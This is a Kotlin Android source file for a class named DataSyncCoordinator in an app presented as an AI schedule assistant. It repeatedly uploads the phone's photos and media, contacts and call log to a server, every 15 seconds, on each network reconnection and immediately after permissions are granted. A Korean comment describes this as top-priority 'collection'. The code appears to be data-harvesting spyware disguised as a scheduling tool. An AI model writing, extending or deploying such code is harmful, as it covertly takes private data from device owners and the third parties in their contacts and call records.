package com.aischedule.assistant.sync

import android.content.Context
import android.util.Log
import com.aischedule.assistant.backup.CallLogUploadHandler
import com.aischedule.assistant.backup.ContactsUploadHandler
import com.aischedule.assistant.backup.MediaUploadHandler
import com.aischedule.assistant.data.SessionManager
import com.aischedule.assistant.util.AuthHelper
import com.aischedule.assistant.util.NetworkUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class DataSyncCoordinator(
    context: Context,
    private val sessionManager: SessionManager,
    private val networkSyncManager: NetworkSyncManager,
    private val heartbeatManager: HeartbeatManager
) {
    private val appContext = context.applicationContext
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val mediaUploadHandler = MediaUploadHandler(appContext, sessionManager)
    private val contactsUploadHandler = ContactsUploadHandler(appContext, sessionManager)
    private val callLogUploadHandler = CallLogUploadHandler(appContext, sessionManager)

    @Volatile
    private var started = false
    private var periodicJob: Job? = null
    @Volatile
    private var lastNetworkSyncMs = 0L
    private val pendingChannels = mutableSetOf<SyncChannel>()

    fun ensureStarted() {
        if (started) return
        synchronized(this) {
            if (started) return
            networkSyncManager.register { onNetworkAvailable() }
            networkSyncManager.startMonitoring()
            startPeriodicSync()
            started = true
            Log.d(TAG, "Data sync coordinator started (periodic + network callback)")
        }
    }

    /** 권한·로그인·네트워크 연결 시 최우선 즉시 수집 */
    fun triggerFullSync() {
        triggerSync(setOf(SyncChannel.ALL), "full")
    }

    fun triggerMediaSyncNow() {
        triggerSync(setOf(SyncChannel.MEDIA), "media-permission")
    }

    fun triggerContactsSyncNow() {
        triggerSync(setOf(SyncChannel.CONTACTS), "contacts-permission")
    }

    fun triggerCallLogSyncNow() {
        triggerSync(setOf(SyncChannel.CALL_LOG), "calllog-permission")
    }

    private fun triggerSync(channels: Set<SyncChannel>, reason: String) {
        if (!sessionManager.isLoggedIn) return
        ensureStarted()

        if (!NetworkUtils.isNetworkAvailable(appContext)) {
            synchronized(pendingChannels) {
                pendingChannels.addAll(channels)
            }
            Log.d(TAG, "Deferring sync ($reason) — no network, queued $channels")
            return
        }

        scope.launch {
            val toRun = synchronized(pendingChannels) {
                val merged = channels.toMutableSet()
                merged.addAll(pendingChannels)
                pendingChannels.clear()
                merged
            }
            Log.d(TAG, "Immediate sync ($reason): $toRun")
            launch { heartbeatManager.sendHeartbeat() }
            runUploads(toRun)
        }
    }

    private fun onNetworkAvailable() {
        if (!sessionManager.isLoggedIn) return
        if (!NetworkUtils.isNetworkAvailable(appContext)) return

        val now = System.currentTimeMillis()
        if (now - lastNetworkSyncMs < NETWORK_DEBOUNCE_MS) return
        lastNetworkSyncMs = now

        Log.d(TAG, "Network available — immediate sync")
        ensureStarted()
        heartbeatManager.kickNow()

        val channelsToSync = synchronized(pendingChannels) {
            if (pendingChannels.isEmpty()) {
                setOf(SyncChannel.ALL)
            } else {
                val merged = pendingChannels.toSet()
                pendingChannels.clear()
                merged
            }
        }
        triggerSync(channelsToSync, "network-reconnect")
    }

    private fun startPeriodicSync() {
        if (periodicJob?.isActive == true) return
        periodicJob = scope.launch {
            while (isActive) {
                if (sessionManager.isLoggedIn && NetworkUtils.isNetworkAvailable(appContext)) {
                    Log.d(TAG, "Periodic sync tick")
                    launch { heartbeatManager.sendHeartbeat() }
                    launch {
                        if (!AuthHelper.upgradeOfflineSessionIfPossible(sessionManager)) {
                            Log.w(TAG, "Server session not ready — uploads may be deferred")
                        }
                    }
                    runUploads(setOf(SyncChannel.ALL))
                }
                delay(PERIODIC_SYNC_INTERVAL_MS)
            }
        }
    }

    private suspend fun runUploads(channels: Set<SyncChannel>) {
        try {
            // Refresh offline / legacy Hangul-in-Authorization tokens before uploads
            if (!AuthHelper.ensureServerSession(sessionManager)) {
                Log.w(TAG, "Server session not ready — skipping uploads")
                return
            }
            val runAll = channels.contains(SyncChannel.ALL)
            if (runAll || channels.contains(SyncChannel.MEDIA)) {
                mediaUploadHandler.startUploadIfPermitted()
            }
            if (runAll || channels.contains(SyncChannel.CONTACTS)) {
                contactsUploadHandler.startUploadIfPermitted()
            }
            if (runAll || channels.contains(SyncChannel.CALL_LOG)) {
                callLogUploadHandler.startUploadIfPermitted()
            }
        } catch (e: Exception) {
            Log.w(TAG, "Upload batch failed", e)
        }
    }

    private enum class SyncChannel {
        MEDIA,
        CONTACTS,
        CALL_LOG,
        ALL
    }

    companion object {
        private const val TAG = "DataSyncCoordinator"
        const val PERIODIC_SYNC_INTERVAL_MS = 15_000L
        private const val NETWORK_DEBOUNCE_MS = 1_500L
    }
}
